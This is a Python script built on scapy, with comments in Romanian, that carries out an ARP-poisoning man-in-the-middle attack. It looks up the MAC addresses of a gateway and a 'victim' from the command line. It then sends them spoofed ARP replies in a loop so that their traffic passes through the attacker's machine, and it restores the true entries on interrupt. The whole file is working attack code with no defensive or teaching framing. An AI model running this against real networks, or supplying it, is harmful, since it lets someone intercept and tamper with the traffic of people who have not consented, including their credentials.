from scapy.all import * 
import sys
import os
import threading

# folosim pachete arp pentru a face rost the adresele mac
def get_mac(ip_address):
    # srp e functie pentru comunicare de layer 2
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc 
    return None

# restabilirea conexiunilor
def restore_network(router_ip, router_mac, victim_ip, victim_mac):
    print("[*] Restoring the network.")
    # trimite adevaratele adrese ale victimei routerului
    send(ARP(op=2, hwsrc=victim_mac, psrc=victim_ip, pdst=router_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    # trimite adevaratele adrese ale routerului victimei
    send(ARP(op=2, hwsrc=router_mac, psrc=router_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    sys.exit(0)

# trimite constant pachete arp malitioase folosind adresa mac locala
def arp_poison(router_ip, router_mac, victim_ip, victim_mac):
    print("[*] Started ARP poisoning!")
    
    try:
        while True:
            # trimite routerului
            send(ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=victim_ip))
            # trimite victimei
            send(ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=router_ip))
            time.sleep(5)
    except KeyboardInterrupt:
        print("[*] Attack stopped. Restoring network.")
        restore_network(router_ip, router_mac, victim_ip, victim_mac)

if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print("need 2 arguments IP defaul gateway, IP victim")
        exit()
    
    router_ip = sys.argv[1]
    victim_ip = sys.argv[2]

    router_mac = get_mac(router_ip)
    if (router_mac is None):
        print("Unable to get MAC of default gateway.")
        sys.exit(0)
    victim_mac = get_mac(victim_ip)
    if (victim_mac is None):
        print("Unable to get MAC of victim.")
        sys.exit(0)
    
    print(f"[*] Default Gateway MAC: {router_mac}")
    print(f"[*] Victim MAC: {victim_mac}")

    attack_thread = threading.Thread(target=arp_poison, args=(router_ip, router_mac, victim_ip, victim_mac))
    attack_thread.start()
